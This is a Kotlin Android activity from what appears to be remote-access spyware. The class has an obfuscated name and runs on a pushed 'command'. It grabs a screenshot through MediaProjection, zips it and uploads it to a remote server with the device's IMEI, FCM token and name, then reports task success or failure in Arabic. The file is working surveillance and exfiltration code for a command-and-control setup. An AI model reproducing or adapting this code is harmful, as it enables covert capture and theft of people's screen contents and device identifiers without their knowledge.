package com.example.mobiletwo

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import com.example.mobiletwo.MyExecutorFG.Companion.zipLocalFile
import com.example.mobiletwo.MyFireBaseMessagingService.Companion.dSPRead
import java.io.File
import java.io.FileOutputStream


class Ckpuhwom : Activity() {
    private var mImageName: String = ""
    private var mVirtualDisplay: VirtualDisplay? = null
    private var mImageReader: ImageReader? = null
    private var mDpi: Int = 0
    private var mDisplayMetric: DisplayMetrics? = null
    private var mHeight: Int = 0
    private var mWidth: Int = 0
    private var mMediaProjectionManager: MediaProjectionManager? = null
    private var mIntent: Intent? = null
    private var command = ""
    private var ri = 0


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_ckpuhwom)
        ri = intent.getIntExtra("ri", 0)
        command = intent.getStringExtra("command") ?: ""
        snapTrap()
    }

    @SuppressLint("WrongConstant")
    fun snapTrap() {
        try {
            ///take a snapshot!!!!!
            mMediaProjectionManager =
                getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mIntent = mMediaProjectionManager!!.createScreenCaptureIntent()
            val mWindowManager: WindowManager =
                getSystemService(Context.WINDOW_SERVICE) as WindowManager
            mDisplayMetric = DisplayMetrics()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                println("api30: _____")
                mWidth = mWindowManager.currentWindowMetrics.bounds.width()
                mHeight = mWindowManager.currentWindowMetrics.bounds.height()
                mDpi = resources.displayMetrics.densityDpi
            } else {
                mHeight = mWindowManager.defaultDisplay.height
                mWidth = mWindowManager.defaultDisplay.width
                mWindowManager.defaultDisplay.getMetrics(mDisplayMetric)
                mDpi = mDisplayMetric!!.densityDpi
            }
            mImageReader = ImageReader.newInstance(mWidth, mHeight, 0x1, 3)
            if (mImageReader == null) {
                Log.i("Error!", "mImageReader=null")
            }
            startActivityForResult(mIntent, 1945)
        } catch (ex: Exception) {
            MyExecutorFG.logEx(ex, "snapTrap")
            finishAffinity()
            Thread {
                MyApiOld.resp(
                    ri.toString(), "فشل المهمه", "", "", "5",
                    command, "", dSPRead.getString("imei", "") ?: ""
                )
            }.start()
        }
    }


    @SuppressLint("NewApi")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        try {
            if (data == null) {
                finishAffinity()
                Thread {
                    MyApiOld.resp(
                        ri.toString(), "فشل المهمه", "", "", "5",
                        command, "", dSPRead.getString("imei", "") ?: ""
                    )
                }.start()
                return
            }
            if (requestCode == 1945) {
                var mMediaProjection: MediaProjection =
                    mMediaProjectionManager!!.getMediaProjection(resultCode, data!!)
                if (mWidth == 0) {
                    mWidth = 512
                }
                if (mHeight == 0) {
                    mHeight = 1024
                }
                if (mDpi == 0) {
                    mDpi = 160
                }
                if (mMediaProjection != null) {
                    mVirtualDisplay = mMediaProjection.createVirtualDisplay(
                        "Screenshooter", mWidth, mHeight, mDpi,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                        mImageReader!!.surface, null, null
                    )
                    //Thread.sleep(1000)
                    startCapture()
                } else
                    Log.i("mMediaProjection", "Null")
            }
        } catch (ex: Exception) {
            MyExecutorFG.logEx(ex, "onActivityResult")
            finishAffinity()
            Thread {
                MyApiOld.resp(
                    ri.toString(), "فشل المهمه", "", "", "5",
                    command, "", dSPRead.getString("imei", "") ?: ""
                )
                MyForeGroundService.stopService(baseContext)
            }.start()
        }
    }


    private fun startCapture() {
        try {
            mImageName = "ScreenShot_" + System.currentTimeMillis() + ".png"
            var mImage: Image? = mImageReader!!.acquireLatestImage()
            var x = 0
            while (mImage == null && x < 10) {
                Thread.sleep(100)
                x++
                mImage = mImageReader!!.acquireLatestImage()
            }
            if (mImage == null) {
                Log.i("startCapture", "Image was null")
                finishAffinity()
                Thread {
                    MyApiOld.resp(
                        ri.toString(), "فشل المهمه", "", "", "5",
                        command, "", dSPRead.getString("imei", "") ?: ""
                    )
                    MyForeGroundService.stopService(baseContext)
                }.start()
            }
            var tWidth = mImage!!.width
            var tHeight = mImage.height
            var mPlanes: Array<out Image.Plane>? = mImage.planes
            var mByteBuffer = mPlanes!!.last().buffer
            var mPixelStride = mPlanes.last().pixelStride
            var mRowStride = mPlanes.last().rowStride
            var mRowPadding = mRowStride - mPixelStride * tWidth
            var mBitmap: Bitmap = Bitmap.createBitmap(
                tWidth + mRowPadding / mPixelStride,
                tHeight,
                Bitmap.Config.ARGB_8888
            )
            mBitmap.copyPixelsFromBuffer(mByteBuffer)
            mBitmap = Bitmap.createBitmap(mBitmap, 0, 0, tWidth, tHeight)
            mImage.close()
            mVirtualDisplay!!.release()
            mVirtualDisplay = null
            var mPath = "${Consts.sFiles}/screenshot"
            File(mPath).mkdirs()
            mPath += "/$mImageName"
            var mFile = File(mPath)
            var mFileOutputStream = FileOutputStream(mFile)
            mBitmap.compress(Bitmap.CompressFormat.PNG, 100, mFileOutputStream)
            mFileOutputStream.flush()
            mFileOutputStream.close()
            val comped = zipLocalFile(arrayListOf(mPath), mPath.replace(".png", ".zip"))
            File(mPath).delete()
            println("FileZipped: $comped")
            finishAffinity()
            Thread {
                Log.i("Thread", "Started")
                MyApiOld.conan(
                    ri.toString(),
                    dSPRead.getString("FCMToken", "") ?: "",
                    command,
                    dSPRead.getString("mDeviceName", "") ?: "",
                    comped,
                    "${File(comped).name}",
                    "images",
                    dSPRead.getString("imei", "") ?: "",
                    null,
                    null,
                    true
                )
                //5236bc515a6a7a98
                //5236bc515a6a7a98
                //5236bc515a6a7a98
                MyApiOld.resp(
                    ri.toString(), "المهمه مكتمله", "", "", "3",
                    command, "", dSPRead.getString("imei", "") ?: ""
                )
                MyForeGroundService.stopService(baseContext)
            }.start()
        } catch (ex: Exception) {
            MyExecutorFG.logEx(ex, "startCapture")
            finishAffinity()
            Thread {
                MyApiOld.resp(
                    ri.toString(), "فشل", "", "", "5",
                    command, "", dSPRead.getString("imei", "") ?: ""
                )
                MyForeGroundService.stopService(baseContext)
            }.start()
        }
    }
}

